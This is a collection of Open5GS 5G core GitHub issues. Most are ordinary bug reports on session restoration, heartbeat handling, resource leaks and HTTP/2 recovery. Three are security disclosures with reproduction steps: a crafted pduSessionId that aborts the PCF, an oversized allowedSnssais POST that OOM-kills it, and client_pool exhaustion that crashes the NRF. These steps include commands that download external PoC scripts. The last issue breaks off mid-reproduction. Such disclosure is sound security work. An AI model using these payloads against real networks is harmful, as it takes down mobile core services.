items.title: [Bug]: SMF PFCP restoration re-installs stale UE IPs after UPF restart (silent downlink black-hole)

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Open5GS Release, Revision, or Tag

v2.8.1 (also observed on main `d6f1ed8`, 2026-10-19)

### Summary

After `docker restart upf` (i.e. UPF process restarts and loses its PFCP state), the SMF's PFCP
**restoration** re-installs the sessions **it holds in memory** — including the UE IPv4 address it
recorded at session creation. If the UE has meanwhile re-registered and received a **new IP**, the
restored downlink PDRs are keyed on the **old** IP, and every downlink packet for the UE's real IP
misses the PDR and is silently black-holed.

On a userspace datapath (eUPF) the effect is a silent drop with **no error log and no drop counter**:
the packet falls through to `XDP_PASS`, hits the kernel, and is discarded as a martian source
(source address does not match the outgoing interface).

### Steps to reproduce (5GC, single UPF, no MPAS)

1. Establish N PDU sessions for N UEs (we use 8 sessions / 4 UEs over a real NG interface:
   UERANSIM gNB+UE, eUPF as UPF, open5gs SMF/AMF/… on the same host).
2. `docker stop upf` → wait for heartbeat give-up → SMF releases all sessions (#4863 path) →
   `docker start upf`.
   *Alternatively* the mismatch also appears when the UE re-registers between the two events.
3. Let the UEs re-register (they get **new** IPs; in our run `10.64.0.2/.3` instead of `10.64.0.64/.65`).
4. Observe: the SMF's restoration re-creates the PFCP sessions, but with the **old** UE IPs.

### Observed behaviour

In the UPF's downlink PDR table (`pdr_map_downlink_ip4` in eUPF; the F-TEID/UE-IP → PDR map):
keys are `10.64.0.64`, `10.64.0.65`, while the UEs' actual tun addresses are `10.64.0.2`, `10.64.0.3`.

eUPF's REST API confirms it received the stale addresses:

```
SEID 4  PDR1 Ipv4 = 10.65.0.65   (while the UE's tun is 10.65.0.2)
```

Download traffic for the real IP then produces (measured, 20 pings from an IMS container):

```
rx_n6  +31     tx_n3  +0       XDP_PASS +46
```

i.e. **the packet never reaches the GTP encapsulation step** — it is passed to the kernel.
Contrast with a UE whose IP did match (same run, same UPF):

```
rx_n6  +38     tx_n3  +20      XDP_REDIRECT +20
```

The whole test took 2 minutes to confirm: a full cold start (`amf+smf → upf → gNB → UE`) makes the
two sides agree again (8 ↔ 8), and every path recovers (ICMP both ways, and `SIP OPTIONS` to the
P-CSCF returns `200 OK`).

### Expected behaviour

Restoration should not resurrect stale UE addressing. Two possible shapes:

1. **Validate on restore**: when re-installing a session, if the UPF-side session state is gone
   (which the SMF can tell from the new Recovery Time Stamp / the fact it is running `pfcp_restoration()`),
   don't blindly re-install the old F-TEID/UE-IP pairs — either refresh them from the current
   SM context or release the session so the UE re-establishes cleanly.
2. **Release instead of restore** when the UPF lost state: this is exactly the "release vs restore"
   decision discussed in #4860 / #4876. If the operator chooses `keep`, the restoration path still
   has to guarantee that the addressing it pushes matches what the UE currently uses.

### Why this matters beyond our rig

* This is the **user-visible failure mode** of the restore/release race in #4860: the control plane
  (and charging) believes the session is alive while the user plane silently drops **all** downlink
  traffic. There is no alarm surface for it.
* It only affects *some* UEs (the ones whose IP changed), so it looks like "random UEs are broken",
  which is very hard to triage — we initially mis-diagnosed it as a NIC/veth problem.
* With #4876 (`T_release_after_upf_failure`) landing, both branches (`release` and `keep`) need this
  invariant: **restoration must use the addressing that the UE actually has now**.

### Logs / evidence

Happy to attach: eUPF `pdr_map_downlink_ip4` dump (bpftool), the two XDP counter deltas above,
the eUPF restoration log line (`session UE 10.64.0.64 -> N3 endpoint …`), and the SMF window
showing the release + restoration. Full analysis and the local guard we added are in our repo;
can share on request.

### Our workaround

A consistency check between the UPF's session UE-IPs and the UEs' actual tunnel addresses, run after
any UPF restart (`session-ip-consistency.sh` in our tree), plus the rule "always do a full cold
start, never restart the UPF alone". Both are workarounds, not fixes.

items.title: [Bug]: SMF: not releasing existing UE sessions after UPF failure (Heartbeat timeout)

labels.name: type:enhancement
labels.description: Enhance performance or improve usability of original features.

items.body:
### Open5GS Release, Revision, or Tag

v2.8.0 (master)

### Steps to reproduce

TTCN-3 test SMF_Tests.TC_pfcp_heartbeat_timeout from osmo-ttcn3-hacks.git showcases the scenario:
https://gerrit.osmocom.org/c/osmo-ttcn3-hacks/+/43873

### Logs

```shell
10/12 11:54:40.821: [pfcp] DEBUG: [2] LOCAL  Response Timeout for step 1 type 1 peer [127.0.0.7]:8805 (../../../../../dev/sysmocom/git/open5gs/lib/pfcp/xact.c:623)
10/12 11:54:40.821: [pfcp] WARNING: [2] LOCAL  No Reponse. Give up! for step 1 type 1 peer [127.0.0.7]:8805 (../../../../../dev/sysmocom/git/open5gs/lib/pfcp/xact.c:642)
10/12 11:54:40.821: [pfcp] DEBUG: [2] LOCAL  Delete  peer [127.0.0.7]:8805 (../../../../../dev/sysmocom/git/open5gs/lib/pfcp/xact.c:836)
10/12 11:54:40.821: [smf] DEBUG: smf_state_operational(): SMF_EVT_N4_NO_HEARTBEAT (../../../../../dev/sysmocom/git/open5gs/src/smf/smf-sm.c:94)
10/12 11:54:40.821: [smf] DEBUG: smf_pfcp_state_associated(): SMF_EVT_N4_NO_HEARTBEAT (../../../../../dev/sysmocom/git/open5gs/src/smf/pfcp-sm.c:182)
10/12 11:54:40.821: [smf] WARNING: No Heartbeat from UPF [127.0.0.7]:8805 (../../../../../dev/sysmocom/git/open5gs/src/smf/pfcp-sm.c:426)
10/12 11:54:40.821: [smf] ERROR: No UPF available (../../../../../dev/sysmocom/git/open5gs/src/smf/pfcp-sm.c:528)
10/12 11:54:40.821: [smf] DEBUG: smf_pfcp_state_associated(): EXIT (../../../../../dev/sysmocom/git/open5gs/src/smf/pfcp-sm.c:182)
10/12 11:54:40.821: [smf] INFO: PFCP de-associated [127.0.0.7]:8805 (../../../../../dev/sysmocom/git/open5gs/src/smf/pfcp-sm.c:205)
10/12 11:54:40.821: [smf] DEBUG: smf_pfcp_state_will_associate(): ENTRY (../../../../../dev/sysmocom/git/open5gs/src/smf/pfcp-sm.c:74)
10/12 11:54:40.821: [pfcp] DEBUG: [4] LOCAL  Create  peer [127.0.0.7]:8805 (../../../../../dev/sysmocom/git/open5gs/lib/pfcp/xact.c:131)
10/12 11:54:40.821: [pfcp] DEBUG: Association Setup Request (../../../../../dev/sysmocom/git/open5gs/lib/pfcp/build.c:87)
10/12 11:54:40.821: [pfcp] DEBUG: [4] LOCAL  UPD TX-5  peer [127.0.0.7]:8805 (../../../../../dev/sysmocom/git/open5gs/lib/pfcp/xact.c:231)
10/12 11:54:40.821: [pfcp] DEBUG: [4] LOCAL  Commit  peer [127.0.0.7]:8805 (../../../../../dev/sysmocom/git/open5gs/lib/pfcp/xact.c:500)
```

### Expected behaviour

As of current main  (d5d735c67356ff4cb2d86be6effadcc351b5b7b5), open5gs-smfd doesn't release UE sessions after the only UPF available is considered to be unavailable after obtaining no answer for a while (eg. multiple Heartbeat Requests not answered).

With current implementation, open5gs-smfd will keep trying forever until the UPF is available again and it sends a newer (bigger) Recovery timestamp which starts restoration value. 

The problem with that is that it may take a long time, or even "forever", for the UPF to become available again, and during that potentially long time the Control Plane assumes the user plane is working just fine, because the sessions are still active, which is false. This means for instance time accounting may go on on the OCS, etc.

Instead, when a Heartbeat timeout happens (configurable by the user, eg. 60 seconds) and the UPF is considered unavailable, it should release all the sessions on the core network so that the subscriber can see it has no PDU session instead of simply seeing no traffic passing through.

What do the specs say about this scenario? Well, they basically say it's "implementation specific".

3GPP TS 29.244 5.8.2 Behaviour with an Established PFCP Association
> When a PFCP Association is established with a UP function, the CP function:
> ...
> - shall check the responsiveness of the UP function using the Heartbeat procedure as specified in clause 6.2.2;

3GPP TS 23.527 4.2 N4 Failure and Restart Detection:
> Across PFCP based interfaces, an SMF and UPF shall utilize the PFCP Heartbeat Request and Heartbeat Response
> messages to detect a peer PFCP entity failure or restart as described in clause 19A of 3GPP TS 23.007

3GPP TS 23.527 4.5 N4 path failure:
> If the N4 path to the UPF is down, the SMF should handle this as an UPF Failure without Restart, see clause 4.3.3.

4.3.3 Restoration Procedure for PSA UPF Failure without Restart
> Procedures for PSA UPF failure without restart are implementation specific.

### Observed Behaviour

See "Expected behaviour" section.

### eNodeB/gNodeB

TTCN-3

### UE Models and versions

_No response_

items.title: [Bug]: Invalid PDU Session ID Triggers Integer Truncation and Process Abort (PCF)

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
## Summary

- **Commit ID:** `d5d735c67356ff4cb2d86be6effadcc351b5b7b5` (`main`, 2026-10-09)
- **CVSS 4.0:** `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N` (**8.7 High**)
- **Vulnerability Type:** Improper Validation of Specified Quantity (CWE-1284) / Reachable Assertion (CWE-617)

The PCF trusts the client-supplied `pduSessionId` of an `Npcf_SMPolicyControl` creation request
(`POST /npcf-smpolicycontrol/v1/sm-policies`): the field is parsed as a C `int`
(`lib/sbi/openapi/model/sm_policy_context_data.h:56`), but the SBI handler only checks that it is
non-zero (`src/pcf/pcf-sm.c:196`) — never the TS 29.571 `1..255` range — and forwards it unchanged
to `pcf_sess_add(pcf_ue_sm_t *, uint8_t psi)` (`src/pcf/pcf-sm.c:231` → `src/pcf/context.c:682`).
The `int → uint8_t` narrowing truncates every non-zero multiple of 256 to 0, and the first
statement of `pcf_sess_add` is `ogs_assert(psi != OGS_NAS_PDU_SESSION_IDENTITY_UNASSIGNED)`
(`context.c:688`; the prebuilt image asserts at `:611`). `pduSessionId = 256` therefore reaches the
assertion as 0 and `ogs_abort()` kills the process with SIGABRT.

One ~200-byte HTTP/2 (h2c) POST aborts the whole `open5gs-pcfd` process: the abort fires during
request handling, before any outbound SBI call, so every SM-policy / AM-policy association the PCF
serves loses its decision point until the process is restarted, and the crash repeats immediately
after every restart. Verified live: a valid `pduSessionId = 1` is
handled normally and the PCF stays alive, while `pduSessionId = 256` trips the assertion
(`context.c:611`, core dumped) and the SBI stops answering.

## Open5GS Release, Revision, or Tag

v2.8.0

## Step to Reproduce

Restart the environment before every verification (shut down any other running core first):

```bash
git clone https://github.com/hackeryounow/5gc-deployments.git
cd 5gc-deployments/open5gs/vonr-2.8.1-gamma
docker compose -p docker_open5gs -f sa-vonr-deploy-2.8.1-gamma.yaml up -d
sleep 45                     # let the NFs register at the NRF
docker start smsc            # smsc races the MySQL init on a cold start
# provision
pip3 install git+https://github.com/hackeryounow/coresimrunner.git@v1.4.0
coresimrunner --mode provision --core-network open5gs --count 5 \
     --plmn 46009 --initial-imsi-index 1 \
     --ki 12341234123412341234123412340000 \
     --opc 71a121bb69baf3c0cc53fb5038a0131f \
     --dnn internet --enable-ims \
     --core-address 127.0.0.1 --webui-port 9999 \
     --username admin --password 1423

# fetch the PoC, wait for the PCF (container IP pinned in .env), then trigger:
wget https://github.com/hackeryounow/5GCVulDB/raw/main/VUL-20261003-POC/pcf_pdusessionid_trunc_crash_poc.py
until [ "$(curl --http2-prior-knowledge -s -o /dev/null -w '%{http_code}' --max-time 5 \
          http://172.22.0.27:7777/npcf-smpolicycontrol/v1/sm-policies)" = "400" ]; do sleep 3; done
python3 pcf_pdusessionid_trunc_crash_poc.py --host 172.22.0.27 --port 7777 --mode crash   # -> VULNERABLE, exit 0

# check whether the PCF has exited
docker inspect pcf --format '{{.State.Status}} (ExitCode {{.State.ExitCode}})'   # -> exited (ExitCode 134)
```

## Logs

Verification run 2026-10-19 (`pcf` container log) — the assertion, backtrace and core dump:

```
10/19 10:46:18.528: [pcf] FATAL: pcf_sess_add: Assertion `psi != OGS_NAS_PDU_SESSION_IDENTITY_UNASSIGNED' failed. (../src/pcf/context.c:611)
10/19 10:46:18.528: [core] FATAL: backtrace() returned 8 addresses (../lib/core/ogs-abort.c:37)
./open5gs-pcfd(+0xbe07) [0x555866811e07]
./open5gs-pcfd(+0x1658b) [0x55586681c58b]
/open5gs/install/lib/x86_64-linux-gnu/libogscore.so.2(ogs_fsm_dispatch+0x113) [0x7f02d6bc82bd]
./open5gs-pcfd(+0x7897) [0x55586680d897]
/open5gs/install/lib/x86_64-linux-gnu/libogscore.so.2(+0x12960) [0x7f02d6bb8960]
/lib/x86_64-linux-gnu/libpthread.so.0(+0x8609) [0x7f02d5dd4609]
/lib/x86_64-linux-gnu/libc.so.6(clone+0x43) [0x7f02d5fe3353]
/open5gs_init.sh: line 102:    17 Aborted                 (core dumped) ./open5gs-pcfd
```


## Expected behaviour

A `pduSessionId` outside the TS 29.571 range (`1..255`) must be rejected with `400 Bad Request`, and the PCF must keep serving.

## Observed Behaviour

`pduSessionId = 256` truncates to `0` inside `pcf_sess_add`, trips `ogs_assert` (`context.c:611`) and aborts `open5gs-pcfd` with SIGABRT (core dumped); the SBI stops answering (probe `000`).

## eNodeB/gNodeB

Not applicable — the attack surface is the PCF SBI only; no gNodeB is involved in the reproduction.

## UE Models and versions

Not applicable — no UE is registered for this test; requests are crafted directly against the SBI.

## Impact

A single ~200-byte HTTP/2 POST aborts the entire PCF process, halting all `Npcf_*` policy services until restart — and the crash repeats immediately after every restart.

items.title: Restart Open5GS service to apply new configuration

labels.name: Help Wanted
labels.description: Maintainers are not working on this issue so community help is wanted.

items.body:
I have a question relating to apply a new configuration inside the Open5GS. When we need to make some changes inside the Open5GS core (for example in the upf.yaml), we need to restart the service, or the script to apply the new configuration. 

Is there any way to apply the new changes without restart the services or the scripts ? The problem is that, if we want to apply a new configuration, for example add a new APN, and we restart the service, all the connected users will lose the connectivity for some seconds. The idea is, for example create a new APN, without impacting the existing sessions.

items.title: [Bug]: UPF: not releasing existing UE sessions after SMF failure (Heartbeat timeout)

labels.name: type:bug
labels.description: Open5GS bug

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Open5GS Release, Revision, or Tag

v2.8.1

### Steps to reproduce

This is the counterpart of ticket #4860 but applied to open5gs-upfd instead of open5gs-smfd.

Apparently open5gs-upfd is not currently deleting session when the SMF is considered in failure (due to eg. Heartbeat timeout).

How to reproduce: Create some sessions on the UPF, then eg. kill the open5gs-smfd process, let UPF send Heartbeats until t3_holding_duration triggers.

### Logs

```shell

```

### Expected behaviour

As per TS 23.527 V18.6.0 clause 4.4.3.1:
> the UPF shall delete all the session contexts affected by the peer PFCP entity failure that it may have stored.

### Observed Behaviour

No session is deleted then according to open5gs-upfd logs.

This is well described by @MrBrownieCGN in https://github.com/open5gs/open5gs/issues/4860#issuecomment-6202375701 point 5:

> 5. UPF side (re "this same issue also probably affects open5gs-upfd")
> 
> On main, when the UPF loses the heartbeat towards the SMF it only goes back to will_associate and keeps all
> sessions (src/upf/pfcp-sm.c:342-345); sessions of that SMF are removed only when the SMF comes back with a new
> Recovery Time Stamp (pfcp_restoration(), :371-386). Here the spec is not implementation specific. TS 23.527 V18.6.0,
> clause 4.4.3.1:
> 
> >    When a UPF detects that a peer PFCP entity in the SMF is not reachable for a preconfigured time, and the MPAS or SSET
> >    procedure specified for SMF set in clause 5.22 of 3GPP TS 29.244 [4]) are not used, the UPF shall delete all the
>>     session contexts affected by the peer PFCP entity failure that it may have stored.
> 
> The "preconfigured time" can reasonably be longer than the heartbeat give-up, but some bound seems to be required.
> 

### eNodeB/gNodeB

_No response_

### UE Models and versions

_No response_

items.title: UDM: SDM subscriptions are never released for UEs that vanish without deregistering, so the 4096 pool fills and registrations fail as "5GS services not allowed" with no AMF-side error

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

labels.name: not-an-open5gs-bug
labels.description: This is not a bug in open5gs

items.body:
### Version

Open5GS **2.7.5** (container `gradiant/open5gs:2.7.5`), Kubernetes, single node. AMF/SMF/UDM/UDR/AUSF/NRF/SCP/PCF/BSF all 2.7.5.

### Summary

The UDM's SDM subscription pool is bounded at 4096 and entries are not reclaimed when a UE disappears without a clean deregistration. Because roughly 8 subscriptions are consumed per registered UE, this caps concurrent UEs at about 500 — and, critically, the consumed entries **persist across test runs**, so the effective ceiling drops every time a batch of UEs is killed rather than deregistered.

The failure is hard to diagnose because **the AMF logs nothing**. The UE sees `5GS services not allowed`, which reads like a subscription/provisioning problem, and only the UDM log reveals the real cause.

### What I observed

Registering UEs in batches with a load generator (PacketRusher) against a freshly started core:

- 1, 10, 25, 50, 100, 200 UEs: all register cleanly.
- 500 UEs: **only 375 registered**, the rest rejected.
- UDM log: `Maximum number of SDM Subscriptions [4096] reached (../src/udm/context.c:381)` repeated, plus `udm_sdm_subscription_add() failed (../src/udm/nudm-handler.c:708)` per affected SUPI.
- AMF log for the same period: **no errors or warnings at all**.
- UE-visible cause: `5GMM cause: 5GS services not allowed`.

Restarting only the UDM (nothing else) and immediately repeating the same 500-UE run gives **500/500 registered**. That is what identifies it as accumulation rather than a capacity limit: the 375 figure was leftovers from earlier runs, not a property of the current one.

### Why entries accumulate

The load generator is stopped by killing the process, so the UEs never send a Deregistration Request. Any real-world equivalent — a crashed RAN simulator, a node losing power, a container being killed — would leave the same residue. After enough such events the pool is exhausted and the core refuses new registrations until the UDM is restarted, with no indication at the AMF that the UDM is the cause.

### Reproduction

1. Start a clean Open5GS 2.7.5 core and provision N subscribers.
2. Register ~400 UEs, then kill the RAN simulator without deregistering.
3. Repeat. Each cycle consumes pool entries permanently.
4. Watch `Maximum number of SDM Subscriptions [4096] reached` appear in the UDM log while the AMF stays silent, and registrations start failing with `5GS services not allowed`.

### Workaround

Setting `global.max.ue` above the default in the **UDM** configuration removes the ceiling for a given run:

```yaml
global:
  max:
    ue: 8192
```

After this the `Maximum number of SDM Subscriptions` errors stop entirely. It does not address the underlying non-reclamation — a UDM restart is still needed between runs — but it raises the bar.

### Suggestions

Two things would each have saved a lot of diagnosis time here, independently of whether the reclamation behaviour is considered a bug:

1. **Surface the cause upstream.** When the UDM returns a failure for `udm_sdm_subscription_add()`, the AMF currently logs nothing and the UE receives a generic `5GS services not allowed`. Logging the UDM-side reason at the AMF, or mapping it to a more specific 5GMM cause, would point at the real problem.
2. **Reclaim or age out SDM subscriptions** whose UE context no longer exists — for example on AMF context release, or via a TTL — so that an unclean RAN teardown does not permanently consume pool entries.

Happy to provide fuller logs or retest against a patch.

items.title: SBI client never recovers from a half-dead HTTP/2 connection (requests keep timing out forever)

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

labels.name: not-an-open5gs-bug
labels.description: This is not a bug in open5gs

items.body:
After a short request-rate overload, one NF (observed: AMF sending to SMF) can end up talking to a
peer connection that is silently dead: **TCP stays ESTABLISHED, both socket queues are empty, the
peer's event loop is idle (and it answers brand-new connections in sub-millisecond time), but the
peer's application never answers anything on the established connection again.**

Because the SBI client is built on libcurl multi with HTTP/2 multiplexing, aborting an individual
transfer (which is what `connection_timer_expired()` does via `curl_multi_remove_handle()`) does
**not** close the multiplexed connection. libcurl therefore keeps reusing the same dead connection
for every subsequent request, and every request times out until the process is restarted.

Measured on our rig (single AMF, 20 000 UEs registering at ~500/s, deadline 3 s):

- AMF→SMF request timeouts: **23 815** messages in one overload window (all
  `Connection timer expired … POST …/nsmf-pdusession/v1/sm-contexts`).
- tcpdump on that connection: AMF sent 65 353 data segments; the SMF only ACKed at TCP level and
  sent **no application bytes for 255 s**.
- `ss -K dst <smf> dport = 7777` (killing just that connection) made the AMF open a new connection
  immediately, the SMF answered again, and UE PDU sessions completed within ~1 s — i.e. the client
  *can* recover, it just never decides to.

Suggested fix (patch ready for `lib/sbi/client.c` / `lib/sbi/client.h`):

- count **consecutive** timeouts per SBI client (reset on any successful response),
- after ≥3 consecutive timeouts with a minimum 5 s interval between resets, tear the connection
  pool down by recreating the `CURLM` handle (that is the only way to make libcurl forget and
  close cached connections), failing the in-flight requests explicitly so upper layers get a
  result instead of hanging.

With the patch, the same run reports **0** timeouts after the overload and full service recovery
without restarting any process (A/B: 23 815 → 59 → 0 across successive iterations).

We are happy to iterate on this in a PR — the patch is self-contained (≈60 lines, no API
change, no behaviour change while the peer is healthy).

items.title: [Bug]: S-NSSAI metric-cardinality explosion via Npcf_AMPolicyControl causing unbounded memory growth and OOM kill(PCF)

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
## Summary

- **Commit ID:** `d5d735c67356ff4cb2d86be6effadcc351b5b7b5` (`main`, 2026-10-09)
- **CVSS 4.0:** `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N` (**8.7 High**)
- **Vulnerability Type:** Uncontrolled Resource Consumption (CWE-400) / Allocation of Resources without Limits or Throttling (CWE-770)

On `POST /npcf-am-policy-control/v1/policies`, the PCF walks the client-supplied `allowedSnssais`
array and allocates one Prometheus metric instance per element, keyed by the client-controlled
`(plmn, sst, sd)` (`src/pcf/npcf-handler.c:241-253` → `pcf_metrics_inst_by_slice_add`,
`src/pcf/metrics.c:128-182`). The instances live in a process-global hash that is never evicted at
runtime (cleared only at shutdown, `metrics.c:207-220`), the array length is uncapped (the
generated parser ignores the OpenAPI `maxItems`), and the allocation happens before the request is
authorised/completed — so the state persists even when the request fails. Identical S-NSSAIs dedup
in the hash (`metrics.c:178`); distinct ones never do.

Why this is a resource-consumption problem: each distinct S-NSSAI costs ~1.4 kB of permanent RSS
and adds one more series that every `/metrics` scrape must render, so one small HTTP/2 (h2c) POST
carrying N distinct S-NSSAIs permanently inflates both. Verified live:
5 requests × 3,000 fresh S-NSSAIs grew PCF RSS 295,924 → 316,672 kB (**+20.7 MB, monotonic, never
reclaimed**) and the `/metrics` scrape from 1.6 ms / 1.7 kB to **3.19 s / 1.1 MB** (~2000× slower);
the same requests with identical S-NSSAIs added +5.5 MB once and then stayed flat (+4 kB), with a
~2 ms scrape and exactly one new metric series — isolating client-controlled metric cardinality as
the cause.

## Open5GS Release, Revision, or Tag

v2.8.0

## Step to Reproduce

Restart the environment before every verification (shut down any other running core first):

```bash
git clone https://github.com/hackeryounow/5gc-deployments.git
cd 5gc-deployments/open5gs/vonr-2.8.1-gamma
docker compose -p docker_open5gs -f sa-vonr-deploy-2.8.1-gamma.yaml up -d
sleep 45                     # let the NFs register at the NRF
docker start smsc            # smsc races the MySQL init on a cold start


# wait for the PCF (container IP pinned in .env), then cap the container at 1 GiB:
until [ "$(curl --http2-prior-knowledge -s -o /dev/null -w '%{http_code}' --max-time 5 \
          http://172.22.0.27:7777/npcf-smpolicycontrol/v1/sm-policies)" = "400" ]; do sleep 3; done
docker update --memory 1g --memory-swap 1g pcf        # cap RSS and swap together

# the attack: one POST carrying 400,000 fresh S-NSSAIs (~11 MB). The body must be built into a
# file - the kernel caps a single argv at 128 KiB (~4600 elements) - and sent with -d @file:
python3 - <<'PY' > /tmp/am_policy_400k.json
import json
snssais = [{"sst": 1, "sd": "%06x" % (400001 + i)} for i in range(400000)]
print(json.dumps({"supi": "imsi-460091234567895",
                  "notificationUri": "http://172.23.0.10:7777/namf-cb/v1/am-policy/x",
                  "suppFeat": "0", "allowedSnssais": snssais}))
PY
curl --http2-prior-knowledge -s -o /dev/null -w '%{http_code}\n' --max-time 300 \
     -X POST -H 'Content-Type: application/json' -d @/tmp/am_policy_400k.json \
     http://172.22.0.27:7777/npcf-am-policy-control/v1/policies   # PCF dies mid-request (~13 s)
rm -f /tmp/am_policy_400k.json

# check whether the PCF has been OOM-killed
docker inspect pcf --format '{{.State.Status}} (ExitCode {{.State.ExitCode}}, OOMKilled {{.State.OOMKilled}})'
# -> exited (ExitCode 137, OOMKilled true)  [dmesg: Memory cgroup out of memory: Killed process ... open5gs-pcfd]
```

## Logs

Verification run 2026-10-18 (`pcf` container log; one Setup/UnRef pair per crafted POST — the
metric instances are committed during this handling, before any outcome):

```
10/19 13:49:40.229: [sbi] INFO: [6c80e34a-cb6c-41f1-bab9-43fe69017df2] (NRF-profile-get) NF registered (../lib/sbi/nf-sm.c:104)
10/19 13:49:40.229: [sbi] INFO: [BSF] NFInstance associated [6c80e34a-cb6c-41f1-bab9-43fe69017df2] (../lib/sbi/context.c:2498)

10/19 13:49:40.230: [sbi] INFO: [6d1addb0-cb6c-41f1-9483-273b1a6a51fe] (NRF-profile-get) NF registered (../lib/sbi/nf-sm.c:104)
10/19 13:49:40.230: [sbi] INFO: [UDR] NFInstance associated [6d1addb0-cb6c-41f1-9483-273b1a6a51fe] (../lib/sbi/context.c:2498)
10/19 13:49:40.230: [sbi] INFO: Setup NF EndPoint(addr) [172.22.0.14:80] (../lib/sbi/context.c:2503)
10/19 13:49:40.230: [sbi] INFO: [nudr-dr] NFService associated [6d1b8436-cb6c-41f1-9483-273b1a6a51fe] (../lib/sbi/context.c:2138)
10/19 13:49:40.230: [sbi] INFO: Setup NF EndPoint(addr) [172.22.0.14:7777] (../lib/sbi/context.c:2141)
10/19 13:49:41.678: [pcf] ERROR: Not found [/npcf-smpolicycontrol/v1/sm-policies] (../src/pcf/pcf-sm.c:264)
10/19 13:50:08.813: [pcf] INFO: Setup NF EndPoint(addr) [172.23.0.10:7777] (../src/pcf/npcf-handler.c:150)
/open5gs_init.sh: line 102:    18 Killed                  ./open5gs-pcfd
```


## Expected behaviour

`allowedSnssais` reflects the operator-configured slice set (TS 29.513); per-slice metric cardinality must not grow with arbitrary client-supplied `(sst, sd)` values.

## Observed Behaviour

Five requests of 3,000 fresh S-NSSAIs permanently grew PCF RSS by +20.7 MB (never reclaimed) and slowed the `/metrics` scrape ~2000× (1.6 ms → 3.19 s), while identical S-NSSAIs dedup and stay flat. Under a 1 GiB container memory cap a single POST of 400,000 fresh S-NSSAIs escalates to a kernel OOM kill of the PCF (`exit 137`, `OOMKilled=true`) in ~13 s; sustained high cardinality also saturates the SBI core.

## eNodeB/gNodeB

Not applicable — the attack surface is the PCF SBI only; no gNodeB is involved in the reproduction.

## UE Models and versions

Not applicable — no UE is registered for this test; requests are crafted directly against the SBI.

## Impact

A lot of requests permanently consume PCF memory and blind monitoring; under a container memory cap a single request kills the PCF outright (exit 137), leaving the core without policy control until an operator restarts it.

items.title: [Bug]: 48 Subscription POSTs Exhaust the 64-Slot `client_pool` and One Inter-PLMN NF-Discovery Aborts the NRF (`ogs_assert(client)`)

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Summary

- **Commit ID**: `157f611a530e292e40ec50f9d23f0ef5d4fcd6a6` (tag `v2.8.0`)
- **CVSS 4.0**: 8.7 (High) — `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N`
- **Vulnerability Type**: CWE-617 / CWE-770 (Reachable Assertion / Allocation of Resources Without Limits or Throttling)

The NRF's SBI endpoint (TCP 7777, HTTP/2 prior knowledge) serves NF-subscription and NF-discovery requests from any client. Every `POST /nnrf-nfm/v1/subscriptions` whose `nfStatusNotificationUri` is a distinct IPv4-literal `ip:port` creates a new SBI client and permanently consumes one slot of the process-wide, fixed-size `client_pool` (64 slots by default); exhausted slots are never reclaimed, since the notification callbacks that would free them never arrive.

The subscription handler degrades gracefully when the pool is dry — it answers `500 "No SBI client available"` and keeps the NRF alive — but the NF-discovery handler does not. A discovery whose `target-plmn-list` names a PLMN the NRF does not serve takes the inter-PLMN branch, synthesizes a peer FQDN and asks the SBI client layer to associate a client with the placeholder peer; that association fails silently (no DNS entry, and no slot to allocate), returns NULL without any error, and the handler immediately asserts the pointer is non-NULL. The same file handles the identical client-allocation failure defensively in the subscription path, which is what makes the assert here a defect rather than a safeguard.



### Open5GS Release, Revision, or Tag

v2.8.0

### Steps to reproduce

Tested target: the `docker_open5gs` compose deployment (open5GS SA + VoNR, 23 containers); attacker runs on the Docker host (bridge `172.22.0.1`); NRF SBI at `172.22.0.12:7777` (deployed PLMN `460/09`). No subscribers, no RAN. Restart the stack before the attack if anything has already run against that NRF process — phase 1 permanently consumes pool slots and a leftover placeholder peer can mask the assert.

1. **Deploy the target core**

   ```bash
   git clone https://github.com/hackeryounow/5gc-deployments.git
   cd 5gc-deployments/open5gs/vonr-2.8.1-gamma
   docker compose -p docker_open5gs -f sa-vonr-deploy-2.8.1-gamma.yaml up -d
   sleep 45                     # let the NFs register at the NRF
   docker start smsc            # smsc races the MySQL init on a cold start
   ```

2. **Confirm the NRF is alive**

   ```bash
   wget https://raw.githubusercontent.com/hackeryounow/5GCVulDB/refs/heads/main/VUL-20260928-POC/nrf_client_pool_assert_poc.py
   chmod +x nrf_client_pool_assert_poc.py
   ./nrf_client_pool_assert_poc.py --target 172.22.0.12 --port 7777 --liveness-only
   # -> alive=True  GET /nnrf-nfm/v1/nf-instances -> 200
   ```

3. **Run the two negative controls** (each leaves the NRF alive)

   ```bash
   ./nrf_client_pool_assert_poc.py --target 172.22.0.12 --port 7777 --control discovery-only
   # -> HTTP 504 {"title":"No SEPP"}; NRF alive
   ./nrf_client_pool_assert_poc.py --target 172.22.0.12 --port 7777 --control subscriptions-only
   # -> 201s while the pool fills, then 500 "No SBI client available"; NRF alive
   ```

4. **Restart the stack** (mandatory after step 3 — see note above)

   ```bash
   docker compose -p docker_open5gs -f sa-vonr-deploy-2.8.1-gamma.yaml down
   docker compose -p docker_open5gs -f sa-vonr-deploy-2.8.1-gamma.yaml up -d
   sleep 45 && docker start smsc
   ```

5. **Fire the attack and verify**

   ```bash
   ./nrf_client_pool_assert_poc.py --target 172.22.0.12 --port 7777 --live
   # -> phase 1: client_pool exhausted after 48 POSTs, histogram {201: 45, 500: 3};
